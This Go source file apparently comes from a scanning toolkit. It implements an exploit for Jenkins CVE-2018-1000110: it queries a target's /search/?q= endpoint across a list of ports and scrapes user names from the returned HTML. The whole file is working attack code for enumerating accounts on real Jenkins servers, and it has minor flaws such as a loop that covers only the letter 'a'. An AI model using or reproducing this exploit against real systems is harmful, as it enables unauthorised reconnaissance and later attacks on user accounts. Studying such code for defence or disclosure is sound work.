package jenkins

import (
	"fmt"
	"github.com/PuerkitoBio/goquery"
	"io/ioutil"
	"log"
	"net/http"
	"strings"
	"time"
)

func FindUserFromHTML(html string) []string {
	ans := make([]string, 0)
	dom, err := goquery.NewDocumentFromReader(strings.NewReader(html))
	if err != nil {
		log.Fatalln(err)
	}

	dom.Find("ol").Each(func(i int, selection *goquery.Selection) {
		dom.Find("li").Each(func(i int, selection *goquery.Selection) {
			val, exists := selection.Attr("id")
			if !exists {
				return
			}
			if strings.Contains(val, selection.Text()) {
				ans = append(ans, strings.Replace(selection.Text(), "\n", "", -1))
			}
		})
	})
	return ans
}

func JenkinsCVE_2018_1000110(ip string, ports []string, timeOut time.Duration) (user []string, err error) {
	if len(ports) == 0 {
		ports = default_ports
	}
	http_cli := &http.Client{
		Timeout: timeOut,
	}
	user_set := make(map[string]bool, 0)
	for _, port := range ports {
		for i := 'a'; i <= 'a'; i++ {
			name := fmt.Sprintf("%q", i)
			name = strings.ReplaceAll(name, "'", "")
			addr := fmt.Sprintf("http://%s:%s/search/?q="+name, ip, port)
			request, err := http.NewRequest("GET", addr, nil)
			resp, err := http_cli.Do(request)
			if err != nil {
				continue
			}
			out, err := ioutil.ReadAll(resp.Body)
			if err != nil {
				continue
			}

			for _, tmp := range FindUserFromHTML(string(out)) {
				user_set[tmp] = true
			}
		}

	}
	for k, _ := range user_set {
		user = append(user, k)
	}
	return
}
